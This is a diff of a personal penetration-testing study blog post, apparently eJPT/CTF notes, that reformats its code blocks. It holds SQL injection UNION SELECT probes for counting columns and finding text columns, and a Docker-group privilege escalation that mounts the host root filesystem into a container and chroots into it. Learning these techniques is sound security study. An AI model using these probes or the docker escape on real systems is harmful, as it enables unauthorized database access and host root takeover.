@@ -1,5 +1,5 @@
 ---
-title:  SQL Injection,
+title:  SQL Injection...
 categories:
   - blog
 tags:
@@ -20,19 +20,18 @@ So I spend some time on INE eJPT path, to really get into the basics again&#x202
 I quess this is a Enumeration methoth anyone can remember :)
 </p>
 
-<p>
-<code>' UNION SELECT NULL--</code> <br />
-<code>' UNION SELECT NULL,NULL--</code> <br />
-<code>' UNION SELECT NULL,NULL,NULL--</code> <br />
-</p>
+<div class="org-src-container">
+<pre class="src src-sql"><span style="font-style: italic;">''</span> <span style="font-weight: bold;">UNION</span> <span style="font-weight: bold;">SELECT</span> <span style="font-weight: bold;">NULL</span><span style="color: #6b7566; background-color: #262626;">--</span>
+<span style="font-style: italic;">''</span> <span style="font-weight: bold;">UNION</span> <span style="font-weight: bold;">SELECT</span> <span style="font-weight: bold;">NULL</span>,<span style="font-weight: bold;">NULL</span><span style="color: #6b7566; background-color: #262626;">--</span>
+<span style="font-style: italic;">''</span> <span style="font-weight: bold;">UNION</span> <span style="font-weight: bold;">SELECT</span> <span style="font-weight: bold;">NULL</span>,<span style="font-weight: bold;">NULL</span>,<span style="font-weight: bold;">NULL</span><span style="color: #6b7566; background-color: #262626;">--</span>
 
 
-<p>
-<code>' UNION SELECT 'a',NULL,NULL,NULL--</code> <br />
-<code>' UNION SELECT NULL,'a',NULL,NULL--</code> <br />
-<code>' UNION SELECT NULL,NULL,'a',NULL--</code> <br />
-<code>' UNION SELECT NULL,NULL,NULL,'a'--</code> <br />
-</p>
+<span style="font-style: italic;">''</span> <span style="font-weight: bold;">UNION</span> <span style="font-weight: bold;">SELECT</span> <span style="font-style: italic;">'a'</span>,<span style="font-weight: bold;">NULL</span>,<span style="font-weight: bold;">NULL</span>,<span style="font-weight: bold;">NULL</span><span style="color: #6b7566; background-color: #262626;">--</span>
+<span style="font-style: italic;">''</span> <span style="font-weight: bold;">UNION</span> <span style="font-weight: bold;">SELECT</span> <span style="font-weight: bold;">NULL</span>,<span style="font-style: italic;">'a'</span>,<span style="font-weight: bold;">NULL</span>,<span style="font-weight: bold;">NULL</span><span style="color: #6b7566; background-color: #262626;">--</span>
+<span style="font-style: italic;">''</span> <span style="font-weight: bold;">UNION</span> <span style="font-weight: bold;">SELECT</span> <span style="font-weight: bold;">NULL</span>,<span style="font-weight: bold;">NULL</span>,<span style="font-style: italic;">'a'</span>,<span style="font-weight: bold;">NULL</span><span style="color: #6b7566; background-color: #262626;">--</span>
+<span style="font-style: italic;">''</span> <span style="font-weight: bold;">UNION</span> <span style="font-weight: bold;">SELECT</span> <span style="font-weight: bold;">NULL</span>,<span style="font-weight: bold;">NULL</span>,<span style="font-weight: bold;">NULL</span>,<span style="font-style: italic;">'a'</span><span style="color: #6b7566; background-color: #262626;">--</span>
+</pre>
+</div>
 
 <p>
 More info can be found here:
@@ -53,20 +52,22 @@ Reference:
 Basically if you are in the docker group, you can do the following:
 </p>
 
-<p>
-<code>#Search the socket</code> <br />
-<code>find / -name docker.sock 2&gt;/dev/null</code> <br />
-<code>#It's usually in /run/docker.sock</code> <br />
-</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #6b7566; background-color: #262626;">#</span><span style="color: #6b7566; background-color: #262626;">Search the socket</span>
+find / -name docker.sock 2&gt;/dev/null
+<span style="color: #6b7566; background-color: #262626;">#</span><span style="color: #6b7566; background-color: #262626;">It's usually in /run/docker.sock</span>
+</pre>
+</div>
 
 <p>
 If found, than generate a new image, and mount the host filesystem into you image and chroot into it&#x2026; thats a pretty nice.
 Although not that realistic I guess, but good for CTFs
 </p>
 
-<p>
-<code>#List images to use one</code> <br />
-<code>docker images</code> <br />
-<code>#Run the image mounting the host disk and chroot on it</code> <br />
-<code>docker run -it -v /:/host/ ubuntu:18.04 chroot /host</code> <br />
-</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #6b7566; background-color: #262626;">#</span><span style="color: #6b7566; background-color: #262626;">List images to use one</span>
+docker images
+<span style="color: #6b7566; background-color: #262626;">#</span><span style="color: #6b7566; background-color: #262626;">Run the image mounting the host disk and chroot on it</span>
+docker run -it -v /:/host/ ubuntu:18.04 chroot /host
+</pre>
+</div>
